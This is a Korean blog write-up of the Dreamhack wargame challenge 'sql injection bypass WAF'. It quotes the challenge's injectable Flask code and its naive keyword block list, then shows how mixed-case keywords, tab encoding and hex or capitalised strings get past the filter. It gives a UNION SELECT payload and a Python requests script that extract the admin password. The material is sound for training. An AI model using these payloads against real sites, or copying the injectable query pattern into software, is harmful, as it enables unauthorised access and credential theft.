---
layout: post
title: "[드림핵][Lv.1] sql injection bypass WAF 문제 풀이"
date:   2025-07-15 13:00:00 +0900
categories: [CTF & Writeups]
tags: [wargame, web, union-sqli, bypass]
---

## 1. 개요 (Overview)

- **플랫폼 (Platform)**: 드림핵
- **문제 이름 (Challenge)**: sql injection bypass WAF
- **분야 (Category)**: 웹해킹
- **문제 링크 (URL)**: [드림핵 워게임](https://dreamhack.io/wargame/challenges/415)



## 2. 문제 분석 (Problem Analysis)

```python
# 예시: app.py
keywords = ['union', 'select', 'from', 'and', 'or', 'admin', ' ', '*', '/']
def check_WAF(data):
    for keyword in keywords:
        if keyword in data: # <- 이 부분을 주목!
            return True
    return False

@app.route('/', methods=['POST', 'GET'])

def index():
	uid = request.args.get('uid')
	if uid:
		if check_WAF(uid):
			return 'your request has been blocked by WAF.'
		cur = mysql.connection.cursor()
		cur.execute(f"SELECT * FROM user WHERE uid='{uid}';")
		result = cur.fetchone()
		if result:
			return template.format(uid=uid, result=result[1])
		else:
			return template.format(uid=uid, result='')
	else:
		return template
```

---

### 1. 문제 해설
- 이 문제의 핵심은 check_WAF() 함수를 우회하는 방법을 아느냐 모르냐 이다.
- 위에 check_WAF()함수에서 두 가지 허점이 있다.
    
#### 1) 대소문자를 구분한다.
- keywords 리스트의 모든 단어는 소문자이다.
- 하지만 파이서 in 연산자는 대소문자를 구분하므로, 'union'은 필터링이 되지만, 'UNION'이나 'uNiOn' 등은 필터링되지 않는다.
- 만약 제대로 대소문자를 구분 없이 필터링 한다면, lower() 또는 upper() 메서드를 사용하여 문자열을 소문자 또는 대문자로 변환 한 후 검사를 해써야 했다.

#### 2) 공백 문자(스페이스)만 필터링 한다.
- 리스트에 ' '(스페이스)만 포함되어 있다. 
- 하지만 SQL에서는 스페이스 외에도 다양한 공백 문자를 인식하는 방법이 있다.
- 대표적으로 탭(\t), 줄바꿈(\n) 등도 공백으로 처리되며, URL에서 탭은 %09로 인코딩 할 수 있다.

#### 3) format(uid=uid, result=result[1]) 
- 이 부분이 중요하다.
- 데이터베이스의 uid 값과 일치하면, result 즉, 두 번째 컬럼만 화면에 보여준다는 의미이다.
- 그래서 우리는 admin의 비밀번호를 알기 위해서는 UNION SELECT 구문을 사용해서 원래는 세번째에 있던 upw 컬럼을 두 번째 자리에 끼워 넣어야 한다.
- 즉, 결론적으로 저 코드 한줄로 인해 공격자가 화면에 출력되는 컬럼의 위치를 파악하고, 그 에 맞춰 UNION SELECT 페이로드를 정교하게 구성하도록 만드는 핵심적인 제약 조건인 셈이다.

--	

### 2. 공격 페이로드 구성
- 위에 허점들을 이용해서 페이로드를 만들어 보자

``` sql
'UNION SELECT 1, upw, 3 FROM user WHERE uid='admin'#
```

- 위는 기본 SQLi 페이로드 구성이다. 이걸 우회하는 버전으로 바꿔야 한다.

#### 2-1) 먼저 키워드를 대문자 또는 대소문자를 섞어서 변경해야 한다.
- union -> uNiOn
- select -> sElEcT
	
#### 2-2) 공백 우회
- 모든 공백을 URL 인코딩된 탭(%09) 또는 공백(%20)으로 변경

#### 2-3) admin 문자열 우회
- admin 문자열 역시 16진수(Hex) 값을 문자열로 인식하기 때문에 16진 값으로 변환
	- admin -> 16진수 값(`0x61646d696e`)
	- 또는 Admin 입력

#### 2-4) 최종 페이로드 조합
~~~ sql

'%09uNiOn%09sElEcT%091,upw,3%09fRoM%09user%09wHeRe%09uid=0x61646d696e#

~~~

- 하지만 이렇게 입력 폼에 입력을 하게 되면 에러 메시지와 플러그 값을 얻을 수 없다...
- 별 짓을 다 해도 방법이 없어서 고민하다가 제미나이에게 물어보고 답의 힌트를 얻을 수 있었다.


---

### 3. 브라우저 URL 자동 처리(인코딩) 방식과 Python 코드가 서버에 직접 요청을 보내는 방식 차이

#### 3-1) 브라우저의 자동 URL 인코딩
- 웹 브라우저의 주소창이나 웹사이트의 입력 폼에 페이로드를 직접 입력하면, 브라우저는 이를 서버가 이해 할 수 있는 형태로 **"자동으로 변환(URL 인코딩)"** 한다.
- 이 과정에서 몇 가지 문제가 발생 할 수 있다.


##### (1). 예측 불가능한 변환 
- 브라우저는 안전한 전송을 위해 특정 문자열을 %와 16진수 코드로 바꾼다.
- 예를 들어, 큰 따옴표(")는 %22로, 샵(#)은 %23으로 변환하다.
- 문제는 이변환 규칙이 브라우저 종류나 버전에 따라 미묘하게 다를 수 있고, 의도하지 않는 방식으로 문자를 바꿔버릴 수 있다는 점이다.


##### (2). WAF에 탐지될 가능성 증가
- 브라우저가 변환한 최종 URL이 의도했던 우회 패턴과 달라져서, 서버의 WAF(웹 방화벽)에 탐지될 수 있다.

- 즉, 브라우저는 중간 단계를 거치면서 정교하게 만든 페이로드에 미세한 변형이 생겼고, 그 겨로가 서버에서는 공격이 실패했던 것이다.

#### 3-2) Python 스크립트의 직접 전송
- 반면, requests 라이브러리를 사용한 Python 코드는 정교하게 만든 페이로드를 **"어떠한 변형도 없이 그대로"** 서버에 전송한다.

```python
#성공한 코드
param = f"'%09Union%09Select%09null,upw,null%09From%09user%09where%09uid=\"Admin\"%23"
response = get(f"{url}/?uid={param}")
```

##### (1). 완벽한 통제
- 위 코드에서 param 변수에 담긴 문자열은 브라우저의 자동 변환 같은 중간 과정 없이, HTTP 요청의 일부가 되어 서버로 직접 날아간다.
- %09(탭), "(큰따옴표), %23(#) 등 모든 문자가 원래 의도한 위체에 정확히 전달된다.


##### (2). WAF 우회 성공
- 이 처럼 정교하게 제어된 페이로는 서버의 WAF가 예상하고 패턴을 벗어나 필터링을 필 할 수 있었고, SQL Injection 공격이 성공하여 플래그 값을 얻을 수 있었다.

---

### 4. Python 코드

```python
from requests import get

url = "문제의 URL"

param = f"'%09Union%09Select%09null,upw,null%09From%09user%09where%09uid=\"Admin\"%23"
response = get(f"{url}/?uid={param}")
print(response.text)
```

---
